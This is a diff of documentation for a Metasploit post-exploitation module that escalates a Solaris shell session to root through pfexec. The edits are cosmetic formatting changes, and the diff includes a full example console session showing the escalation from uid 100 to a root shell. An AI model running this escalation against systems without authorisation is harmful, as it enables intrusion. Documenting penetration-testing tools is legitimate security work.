@@ -22,11 +22,11 @@
 
 ## Options
 
-  **PFEXEC_PATH**
+### PFEXEC_PATH
 
   Path to pfexec (default: `/usr/bin/pfexec`)
 
-  **SHELL_PATH**
+### SHELL_PATH
 
   Path to shell (default: `/bin/sh`)
 
@@ -34,26 +34,26 @@
 ## Scenarios
 
 ```
-  msf5 > use post/solaris/escalate/pfexec 
-  msf5 post(solaris/escalate/pfexec) > sessions -i 1 -c id
+  msf > use post/solaris/escalate/pfexec 
+  msf post(solaris/escalate/pfexec) > sessions -i 1 -c id
   [*] Running 'id' on shell session 1 (172.16.191.221)
   uid=100(user) gid=10(staff)
 
-  msf5 post(solaris/escalate/pfexec) > set verbose true
+  msf post(solaris/escalate/pfexec) > set verbose true
   verbose => true
-  msf5 post(solaris/escalate/pfexec) > set session 1
+  msf post(solaris/escalate/pfexec) > set session 1
   session => 1
-  msf5 post(solaris/escalate/pfexec) > run
+  msf post(solaris/escalate/pfexec) > run
 
   [*] Trying pfexec as `user' ...
   [*] uid=0(root) gid=0(root)
   [+] Success! Upgrading session ...
   [+] Success! root shell secured
   [*] Post module execution completed
-  msf5 post(solaris/escalate/pfexec) > sessions -i 1 -c id
+  msf post(solaris/escalate/pfexec) > sessions -i 1 -c id
   [*] Running 'id' on shell session 1 (172.16.191.221)
   uid=0(root) gid=0(root)
 
-  msf5 post(solaris/escalate/pfexec) > 
+  msf post(solaris/escalate/pfexec) > 
   ```
 
